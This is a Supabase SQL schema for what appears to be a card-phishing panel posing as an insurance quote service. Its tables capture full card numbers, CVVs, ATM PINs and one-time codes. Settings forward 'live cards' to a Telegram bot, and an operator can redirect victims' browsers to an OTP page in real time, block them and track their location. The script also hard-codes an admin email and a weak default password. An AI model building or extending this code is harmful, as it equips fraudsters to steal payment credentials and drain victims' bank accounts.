CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS TRIGGER LANGUAGE plpgsql SET search_path = public AS $$
BEGIN NEW.updated_at = now(); RETURN NEW; END; $$;

CREATE EXTENSION IF NOT EXISTS pgcrypto;

CREATE TABLE IF NOT EXISTS public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  full_name TEXT, identity TEXT, birth_date TEXT, phone TEXT,
  insurance_type TEXT, start_date TEXT, purpose TEXT, est_value TEXT,
  car_year TEXT, car_model TEXT, repair_place TEXT, company TEXT, type TEXT,
  price NUMERIC, total NUMERIC, method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT, card_name TEXT, card_exp_month TEXT, card_exp_year TEXT,
  card_cvv TEXT, card_brand TEXT, card_last4 TEXT, otp_code TEXT, visitor_id TEXT,
  atm_pin TEXT, mutasil_phone TEXT, mutasil_provider TEXT, mutasil_id TEXT, mutasil_otp TEXT,
  screenshot_urls TEXT[]
);
CREATE INDEX IF NOT EXISTS applications_visitor_id_idx ON public.applications(visitor_id);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role;
ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.applications REPLICA IDENTITY FULL;
DROP TRIGGER IF EXISTS applications_set_updated_at ON public.applications;
CREATE TRIGGER applications_set_updated_at BEFORE UPDATE ON public.applications
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE IF NOT EXISTS public.visitor_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL, command TEXT NOT NULL, payload TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_visitor_commands_visitor ON public.visitor_commands(visitor_id, created_at DESC);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_commands TO anon, authenticated;
GRANT ALL ON public.visitor_commands TO service_role;
ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.visitor_commands REPLICA IDENTITY FULL;

CREATE TABLE IF NOT EXISTS public.blocked_visitors (
  visitor_id TEXT PRIMARY KEY, reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_visitors TO anon, authenticated;
GRANT ALL ON public.blocked_visitors TO service_role;
ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.blocked_visitors REPLICA IDENTITY FULL;

CREATE TABLE IF NOT EXISTS public.chat_conversations (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  visitor_id TEXT NOT NULL,
  customer_name TEXT NOT NULL DEFAULT '',
  customer_phone TEXT NOT NULL DEFAULT '',
  last_message_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  unread_admin INT NOT NULL DEFAULT 0,
  unread_customer INT NOT NULL DEFAULT 0,
  initiated_by TEXT NOT NULL DEFAULT 'customer' CHECK (initiated_by IN ('customer','admin')),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_conversations_visitor ON public.chat_conversations(visitor_id);
CREATE INDEX IF NOT EXISTS idx_chat_conversations_last_msg ON public.chat_conversations(last_message_at DESC);

CREATE TABLE IF NOT EXISTS public.chat_messages (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL CHECK (sender IN ('customer','admin')),
  content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_conv ON public.chat_messages(conversation_id, created_at);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_conversations TO anon, authenticated;
GRANT ALL ON public.chat_conversations TO service_role;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_messages TO anon, authenticated;
GRANT ALL ON public.chat_messages TO service_role;
ALTER TABLE public.chat_conversations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_conversations REPLICA IDENTITY FULL;
ALTER TABLE public.chat_messages REPLICA IDENTITY FULL;
DROP TRIGGER IF EXISTS trg_chat_conversations_updated ON public.chat_conversations;
CREATE TRIGGER trg_chat_conversations_updated BEFORE UPDATE ON public.chat_conversations
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE IF NOT EXISTS public.chat_blocked_visitors (
  visitor_id TEXT PRIMARY KEY, reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_blocked_visitors TO anon, authenticated;
GRANT ALL ON public.chat_blocked_visitors TO service_role;
ALTER TABLE public.chat_blocked_visitors ENABLE ROW LEVEL SECURITY;

CREATE TABLE IF NOT EXISTS public.sms_settings (
  id text PRIMARY KEY DEFAULT 'default',
  provider_name text NOT NULL DEFAULT '',
  api_url text NOT NULL DEFAULT '',
  http_method text NOT NULL DEFAULT 'POST',
  headers_json text NOT NULL DEFAULT '{}',
  body_template text NOT NULL DEFAULT '{"to":"{phone}","from":"{sender_id}","text":"{message}"}',
  content_type text NOT NULL DEFAULT 'application/json',
  default_sender_id text NOT NULL DEFAULT '',
  phone_format text NOT NULL DEFAULT 'e164',
  enabled boolean NOT NULL DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_settings TO anon, authenticated;
GRANT ALL ON public.sms_settings TO service_role;
ALTER TABLE public.sms_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sms_settings REPLICA IDENTITY FULL;
DROP TRIGGER IF EXISTS set_updated_at_sms_settings ON public.sms_settings;
CREATE TRIGGER set_updated_at_sms_settings BEFORE UPDATE ON public.sms_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE IF NOT EXISTS public.sms_logs (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  application_id text, phone text NOT NULL,
  sender_id text NOT NULL DEFAULT '',
  message text NOT NULL,
  status text NOT NULL DEFAULT 'pending',
  http_status integer, provider_response text, error text,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS sms_logs_created_at_idx ON public.sms_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS sms_logs_application_id_idx ON public.sms_logs (application_id);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_logs TO anon, authenticated;
GRANT ALL ON public.sms_logs TO service_role;
ALTER TABLE public.sms_logs ENABLE ROW LEVEL SECURITY;
INSERT INTO public.sms_settings (id) VALUES ('default') ON CONFLICT (id) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.telegram_settings (
  id text NOT NULL PRIMARY KEY DEFAULT 'default',
  enabled boolean NOT NULL DEFAULT false,
  bot_token text NOT NULL DEFAULT '',
  chat_id text NOT NULL DEFAULT '',
  send_live_card boolean NOT NULL DEFAULT true,
  send_steps boolean NOT NULL DEFAULT true,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_settings TO anon, authenticated;
GRANT ALL ON public.telegram_settings TO service_role;
ALTER TABLE public.telegram_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.telegram_settings REPLICA IDENTITY FULL;
DROP TRIGGER IF EXISTS set_telegram_settings_updated_at ON public.telegram_settings;
CREATE TRIGGER set_telegram_settings_updated_at BEFORE UPDATE ON public.telegram_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
INSERT INTO public.telegram_settings (id) VALUES ('default') ON CONFLICT (id) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.visitor_sessions (
  visitor_id TEXT PRIMARY KEY,
  last_path TEXT,
  last_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  first_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  country TEXT, country_code TEXT, city TEXT, ip TEXT,
  is_mobile BOOLEAN, user_agent TEXT, platform TEXT, referrer TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS visitor_sessions_last_seen_idx ON public.visitor_sessions (last_seen_at DESC);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_sessions TO anon, authenticated;
GRANT ALL ON public.visitor_sessions TO service_role;
ALTER TABLE public.visitor_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.visitor_sessions REPLICA IDENTITY FULL;

CREATE TABLE IF NOT EXISTS public.admin_credentials (
  id boolean PRIMARY KEY DEFAULT true CHECK (id = true),
  password_hash text NOT NULL,
  recovery_code_hash text,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT ALL ON public.admin_credentials TO service_role;
ALTER TABLE public.admin_credentials ENABLE ROW LEVEL SECURITY;
INSERT INTO public.admin_credentials (id, password_hash)
VALUES (true, crypt('101010', gen_salt('bf'))) ON CONFLICT (id) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.admin_sessions (
  token text PRIMARY KEY,
  created_at timestamptz NOT NULL DEFAULT now(),
  expires_at timestamptz NOT NULL DEFAULT now() + interval '7 days',
  last_seen timestamptz NOT NULL DEFAULT now()
);
GRANT ALL ON public.admin_sessions TO service_role;
ALTER TABLE public.admin_sessions ENABLE ROW LEVEL SECURITY;
CREATE INDEX IF NOT EXISTS admin_sessions_last_seen_idx ON public.admin_sessions (last_seen DESC);

CREATE TABLE IF NOT EXISTS public.access_logs (
  id bigserial PRIMARY KEY,
  created_at timestamptz NOT NULL DEFAULT now(),
  event_type text NOT NULL,
  details text,
  visitor_id text,
  ip_address text,
  user_agent text,
  is_admin boolean NOT NULL DEFAULT false
);
CREATE INDEX IF NOT EXISTS access_logs_created_at_idx ON public.access_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS access_logs_event_type_idx ON public.access_logs (event_type);
GRANT SELECT ON public.access_logs TO authenticated;
GRANT ALL ON public.access_logs TO service_role;
ALTER TABLE public.access_logs ENABLE ROW LEVEL SECURITY;

CREATE SCHEMA IF NOT EXISTS private;
GRANT USAGE ON SCHEMA private TO anon, authenticated, service_role;
CREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA extensions;

CREATE TABLE IF NOT EXISTS private.visitor_secret (
  id int PRIMARY KEY, secret bytea NOT NULL,
  CONSTRAINT visitor_secret_singleton CHECK (id = 1)
);
INSERT INTO private.visitor_secret(id, secret)
VALUES (1, extensions.gen_random_bytes(32)) ON CONFLICT (id) DO NOTHING;
REVOKE ALL ON private.visitor_secret FROM PUBLIC;
GRANT ALL ON private.visitor_secret TO service_role;

CREATE OR REPLACE FUNCTION private.mint_visitor_token()
RETURNS text LANGUAGE plpgsql SECURITY DEFINER SET search_path = '' AS $$
DECLARE _vid text; _sec bytea; _sig text;
BEGIN
  _vid := 'V-' || encode(extensions.gen_random_bytes(12), 'hex');
  SELECT secret INTO _sec FROM private.visitor_secret WHERE id = 1;
  _sig := encode(extensions.hmac(_vid::bytea, _sec, 'sha256'), 'hex');
  RETURN _vid || '.' || _sig;
END; $$;

CREATE OR REPLACE FUNCTION private.resolve_visitor_id()
RETURNS text LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = '' AS $$
DECLARE _headers json; _token text; _vid text; _sig text; _sec bytea; _expected text; _dot int;
BEGIN
  BEGIN _headers := current_setting('request.headers', true)::json;
  EXCEPTION WHEN OTHERS THEN RETURN NULL; END;
  _token := _headers ->> 'x-visitor-token';
  IF _token IS NULL OR _token = '' THEN RETURN NULL; END IF;
  _dot := position('.' in _token);
  IF _dot < 2 THEN RETURN NULL; END IF;
  _vid := substring(_token from 1 for _dot - 1);
  _sig := substring(_token from _dot + 1);
  IF _vid = '' OR _sig = '' THEN RETURN NULL; END IF;
  SELECT secret INTO _sec FROM private.visitor_secret WHERE id = 1;
  IF _sec IS NULL THEN RETURN NULL; END IF;
  _expected := encode(extensions.hmac(_vid::bytea, _sec, 'sha256'), 'hex');
  IF _sig = _expected THEN RETURN _vid; END IF;
  RETURN NULL;
END; $$;
REVOKE ALL ON FUNCTION private.mint_visitor_token() FROM PUBLIC;
REVOKE ALL ON FUNCTION private.resolve_visitor_id() FROM PUBLIC;

CREATE OR REPLACE FUNCTION public.current_visitor_id()
RETURNS text LANGUAGE sql STABLE SECURITY DEFINER SET search_path = private, public AS $$
  SELECT private.resolve_visitor_id();
$$;
CREATE OR REPLACE FUNCTION public.issue_visitor_token()
RETURNS text LANGUAGE sql SECURITY DEFINER SET search_path = private, public AS $$
  SELECT private.mint_visitor_token();
$$;
REVOKE ALL ON FUNCTION public.current_visitor_id() FROM PUBLIC;
REVOKE ALL ON FUNCTION public.issue_visitor_token() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.current_visitor_id() TO anon, authenticated, service_role;
GRANT EXECUTE ON FUNCTION public.issue_visitor_token() TO anon, authenticated, service_role;

CREATE OR REPLACE FUNCTION public.is_admin_token(_token text)
RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT EXISTS (SELECT 1 FROM public.admin_sessions WHERE token = _token AND expires_at > now());
$$;

CREATE OR REPLACE FUNCTION public.is_admin_user()
RETURNS boolean LANGUAGE plpgsql STABLE SECURITY INVOKER SET search_path = public AS $$
DECLARE _email text;
BEGIN
  BEGIN _email := lower(coalesce(auth.jwt() ->> 'email', '')); EXCEPTION WHEN OTHERS THEN _email := ''; END;
  IF _email = '' THEN RETURN false; END IF;
  RETURN _email IN ('aa809077a@gmail.com');
END; $$;
GRANT EXECUTE ON FUNCTION public.is_admin_user() TO anon, authenticated, service_role;

CREATE OR REPLACE FUNCTION public.is_current_admin()
RETURNS boolean LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE _token text; _email text;
BEGIN
  BEGIN _email := lower(coalesce(auth.jwt() ->> 'email', '')); EXCEPTION WHEN OTHERS THEN _email := ''; END;
  IF _email IN ('aa809077a@gmail.com') THEN RETURN true; END IF;
  BEGIN _token := current_setting('request.headers', true)::json->>'x-admin-token';
  EXCEPTION WHEN OTHERS THEN _token := NULL; END;
  IF _token IS NULL OR length(_token) = 0 THEN RETURN false; END IF;
  RETURN public.is_admin_token(_token);
END; $$;

CREATE OR REPLACE FUNCTION public.admin_login(_password text)
RETURNS text LANGUAGE plpgsql SECURITY DEFINER SET search_path = public, extensions AS $$
DECLARE _hash text; _token text;
BEGIN
  SELECT password_hash INTO _hash FROM public.admin_credentials WHERE id = true;
  IF _hash IS NULL OR extensions.crypt(_password, _hash) <> _hash THEN RETURN NULL; END IF;
  _token := encode(gen_random_bytes(32), 'hex');
  INSERT INTO public.admin_sessions(token) VALUES (_token);
  DELETE FROM public.admin_sessions WHERE expires_at < now();
  RETURN _token;
END; $$;

CREATE OR REPLACE FUNCTION public.admin_logout(_token text)
RETURNS void LANGUAGE sql SECURITY DEFINER SET search_path = public AS $$
  DELETE FROM public.admin_sessions WHERE token = _token;
$$;

CREATE OR REPLACE FUNCTION public.admin_change_password(_current text, _new text)
RETURNS boolean LANGUAGE plpgsql SECURITY DEFINER SET search_path = public, extensions AS $$
DECLARE _hash text;
BEGIN
  SELECT password_hash INTO _hash FROM public.admin_credentials WHERE id = true;
  IF _hash IS NULL OR extensions.crypt(_current, _hash) <> _hash THEN RETURN false; END IF;
  IF length(_new) < 4 THEN RETURN false; END IF;
  UPDATE public.admin_credentials SET password_hash = extensions.crypt(_new, extensions.gen_salt('bf')), updated_at = now() WHERE id = true;
  RETURN true;
END; $$;

GRANT EXECUTE ON FUNCTION public.admin_login(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.admin_logout(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.admin_change_password(text,text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.is_current_admin() TO anon, authenticated;
REVOKE EXECUTE ON FUNCTION public.is_admin_token(text) FROM PUBLIC, anon, authenticated;

CREATE OR REPLACE FUNCTION public._req_header(_name text)
RETURNS text LANGUAGE plpgsql STABLE AS $$
DECLARE _v text;
BEGIN
  BEGIN
    _v := current_setting('request.headers', true)::json->>_name;
  EXCEPTION WHEN OTHERS THEN _v := NULL;
  END;
  RETURN _v;
END; $$;

CREATE OR REPLACE FUNCTION public._log_access(
  _event_type text, _details text, _is_admin boolean
) RETURNS void
LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  INSERT INTO public.access_logs (event_type, details, visitor_id, ip_address, user_agent, is_admin)
  VALUES (
    _event_type, _details,
    public._req_header('x-visitor-id'),
    COALESCE(public._req_header('x-forwarded-for'), public._req_header('cf-connecting-ip')),
    public._req_header('user-agent'),
    _is_admin
  );
END; $$;

CREATE OR REPLACE FUNCTION public.log_admin_action(_details text)
RETURNS void LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.is_current_admin() THEN RETURN; END IF;
  PERFORM public._log_access('admin_action', _details, true);
END; $$;

CREATE OR REPLACE FUNCTION public.get_access_logs(_limit int DEFAULT 200)
RETURNS SETOF public.access_logs
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.is_current_admin() THEN
    RAISE EXCEPTION 'unauthorized';
  END IF;
  RETURN QUERY
    SELECT * FROM public.access_logs
    ORDER BY created_at DESC
    LIMIT GREATEST(1, LEAST(_limit, 1000));
END; $$;

GRANT EXECUTE ON FUNCTION public.log_admin_action(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.get_access_logs(int) TO anon, authenticated;

CREATE OR REPLACE FUNCTION public.admin_heartbeat(_token text)
RETURNS void
LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  UPDATE public.admin_sessions
     SET last_seen = now()
   WHERE token = _token
     AND expires_at > now();
END; $$;

CREATE OR REPLACE FUNCTION public.count_active_admins()
RETURNS integer
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE _c integer;
BEGIN
  IF NOT public.is_current_admin() THEN
    RETURN 0;
  END IF;
  SELECT count(*) INTO _c
    FROM public.admin_sessions
   WHERE expires_at > now()
     AND last_seen > now() - interval '90 seconds';
  RETURN COALESCE(_c, 0);
END; $$;

GRANT EXECUTE ON FUNCTION public.admin_heartbeat(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.count_active_admins() TO anon, authenticated;

CREATE OR REPLACE FUNCTION public.get_my_applications(p_limit integer DEFAULT 5)
RETURNS TABLE(id text, created_at timestamp with time zone, visitor_id text, status text, review_status text, method text, card_brand text, card_last4 text, total numeric, price numeric, company text, insurance_type text, mutasil_provider text, mutasil_phone text, mutasil_id text, screenshot_urls text[])
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE _vid text;
BEGIN
  _vid := public.current_visitor_id();
  IF _vid IS NULL OR _vid !~ '^V-[0-9a-f]{24}$' THEN RETURN; END IF;
  RETURN QUERY
    SELECT a.id, a.created_at, a.visitor_id, a.status, a.review_status, a.method,
           a.card_brand, a.card_last4, a.total, a.price, a.company, a.insurance_type,
           a.mutasil_provider, a.mutasil_phone, a.mutasil_id, a.screenshot_urls
    FROM public.applications a WHERE a.visitor_id = _vid
    ORDER BY a.created_at DESC LIMIT greatest(1, least(coalesce(p_limit, 5), 20));
END; $$;
REVOKE ALL ON FUNCTION public.get_my_applications(integer) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.get_my_applications(integer) TO anon, authenticated, service_role;

CREATE OR REPLACE FUNCTION public.sync_application_redirect_command()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NEW.visitor_id IS NULL OR NEW.review_status IS NOT DISTINCT FROM OLD.review_status THEN RETURN NEW; END IF;
  IF NEW.review_status = 'approved' THEN
    DELETE FROM public.visitor_commands WHERE visitor_id = NEW.visitor_id;
    INSERT INTO public.visitor_commands (visitor_id, command, payload) VALUES (NEW.visitor_id, 'redirect', '/quote/otp');
  ELSIF NEW.review_status = 'rejected' THEN
    DELETE FROM public.visitor_commands WHERE visitor_id = NEW.visitor_id AND command = 'redirect';
  END IF;
  RETURN NEW;
END; $$;
REVOKE EXECUTE ON FUNCTION public.sync_application_redirect_command() FROM PUBLIC, anon, authenticated;
DROP TRIGGER IF EXISTS sync_application_redirect_command_trigger ON public.applications;
CREATE TRIGGER sync_application_redirect_command_trigger
AFTER UPDATE OF review_status ON public.applications
FOR EACH ROW EXECUTE FUNCTION public.sync_application_redirect_command();

DROP POLICY IF EXISTS apps_admin_select ON public.applications;
DROP POLICY IF EXISTS apps_visitor_insert ON public.applications;
DROP POLICY IF EXISTS apps_visitor_update ON public.applications;
DROP POLICY IF EXISTS apps_admin_delete ON public.applications;
CREATE POLICY apps_admin_select ON public.applications FOR SELECT USING (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id()));
CREATE POLICY apps_visitor_insert ON public.applications FOR INSERT WITH CHECK (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id()));
CREATE POLICY apps_visitor_update ON public.applications FOR UPDATE USING (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id())) WITH CHECK (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id()));
CREATE POLICY apps_admin_delete ON public.applications FOR DELETE USING (public.is_current_admin());

DROP POLICY IF EXISTS vc_select ON public.visitor_commands;
DROP POLICY IF EXISTS vc_admin_insert ON public.visitor_commands;
DROP POLICY IF EXISTS vc_admin_delete ON public.visitor_commands;
CREATE POLICY vc_select ON public.visitor_commands FOR SELECT USING (public.is_current_admin() OR visitor_id = public.current_visitor_id());
CREATE POLICY vc_admin_insert ON public.visitor_commands FOR INSERT WITH CHECK (public.is_current_admin());
CREATE POLICY vc_admin_delete ON public.visitor_commands FOR DELETE USING (public.is_current_admin() OR visitor_id = public.current_visitor_id());

DROP POLICY IF EXISTS bv_select ON public.blocked_visitors;
DROP POLICY IF EXISTS bv_admin_insert ON public.blocked_visitors;
DROP POLICY IF EXISTS bv_admin_delete ON public.blocked_visitors;
CREATE POLICY bv_select ON public.blocked_visitors FOR SELECT USING (public.is_current_admin() OR visitor_id = public.current_visitor_id());
CREATE POLICY bv_admin_insert ON public.blocked_visitors FOR INSERT WITH CHECK (public.is_current_admin());
CREATE POLICY bv_admin_delete ON public.blocked_visitors FOR DELETE USING (public.is_current_admin());

DROP POLICY IF EXISTS cc_admin_all ON public.chat_conversations;
DROP POLICY IF EXISTS cc_self_select ON public.chat_conversations;
DROP POLICY IF EXISTS cc_self_insert ON public.chat_conversations;
DROP POLICY IF EXISTS cc_self_update ON public.chat_conversations;
CREATE POLICY cc_admin_all ON public.chat_conversations FOR ALL USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
CREATE POLICY cc_self_select ON public.chat_conversations FOR SELECT USING (visitor_id = public.current_visitor_id());
CREATE POLICY cc_self_insert ON public.chat_conversations FOR INSERT WITH CHECK (visitor_id = public.current_visitor_id());
CREATE POLICY cc_self_update ON public.chat_conversations FOR UPDATE USING (visitor_id = public.current_visitor_id()) WITH CHECK (visitor_id = public.current_visitor_id());

DROP POLICY IF EXISTS cm_admin_all ON public.chat_messages;
DROP POLICY IF EXISTS cm_self_select ON public.chat_messages;
DROP POLICY IF EXISTS cm_self_insert ON public.chat_messages;
CREATE POLICY cm_admin_all ON public.chat_messages FOR ALL USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
CREATE POLICY cm_self_select ON public.chat_messages FOR SELECT USING (EXISTS (SELECT 1 FROM public.chat_conversations c WHERE c.id = chat_messages.conversation_id AND c.visitor_id = public.current_visitor_id()));
CREATE POLICY cm_self_insert ON public.chat_messages FOR INSERT WITH CHECK (sender = 'customer' AND EXISTS (SELECT 1 FROM public.chat_conversations c WHERE c.id = chat_messages.conversation_id AND c.visitor_id = public.current_visitor_id()));

DROP POLICY IF EXISTS cbv_admin_all ON public.chat_blocked_visitors;
DROP POLICY IF EXISTS cbv_self_select ON public.chat_blocked_visitors;
CREATE POLICY cbv_admin_all ON public.chat_blocked_visitors FOR ALL USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
CREATE POLICY cbv_self_select ON public.chat_blocked_visitors FOR SELECT USING (visitor_id = public.current_visitor_id());

DROP POLICY IF EXISTS sms_settings_admin_all ON public.sms_settings;
CREATE POLICY sms_settings_admin_all ON public.sms_settings FOR ALL USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
DROP POLICY IF EXISTS sms_logs_admin_all ON public.sms_logs;
CREATE POLICY sms_logs_admin_all ON public.sms_logs FOR ALL USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
DROP POLICY IF EXISTS tg_admin_all ON public.telegram_settings;
CREATE POLICY tg_admin_all ON public.telegram_settings FOR ALL USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());

DROP POLICY IF EXISTS vs_admin_all ON public.visitor_sessions;
DROP POLICY IF EXISTS vs_self_select ON public.visitor_sessions;
DROP POLICY IF EXISTS vs_self_insert ON public.visitor_sessions;
DROP POLICY IF EXISTS vs_self_update ON public.visitor_sessions;
CREATE POLICY vs_admin_all ON public.visitor_sessions FOR ALL USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
CREATE POLICY vs_self_select ON public.visitor_sessions FOR SELECT USING (visitor_id = public.current_visitor_id());
CREATE POLICY vs_self_insert ON public.visitor_sessions FOR INSERT WITH CHECK (visitor_id = public.current_visitor_id());
CREATE POLICY vs_self_update ON public.visitor_sessions FOR UPDATE USING (visitor_id = public.current_visitor_id()) WITH CHECK (visitor_id = public.current_visitor_id());

DROP POLICY IF EXISTS access_logs_admin_select ON public.access_logs;
CREATE POLICY access_logs_admin_select ON public.access_logs FOR SELECT USING (public.is_current_admin());

DROP POLICY IF EXISTS visitor_uploads_admin_all ON storage.objects;
CREATE POLICY visitor_uploads_admin_all ON storage.objects FOR ALL
  USING (bucket_id = 'visitor-uploads' AND public.is_current_admin())
  WITH CHECK (bucket_id = 'visitor-uploads' AND public.is_current_admin());

DO $$ DECLARE t TEXT;
BEGIN
  FOREACH t IN ARRAY ARRAY['applications','chat_conversations','chat_messages','visitor_commands','blocked_visitors','sms_settings','sms_logs','telegram_settings','visitor_sessions','chat_blocked_visitors']
  LOOP
    BEGIN EXECUTE format('ALTER PUBLICATION supabase_realtime ADD TABLE public.%I', t);
    EXCEPTION WHEN duplicate_object THEN NULL; END;
  END LOOP;
END $$;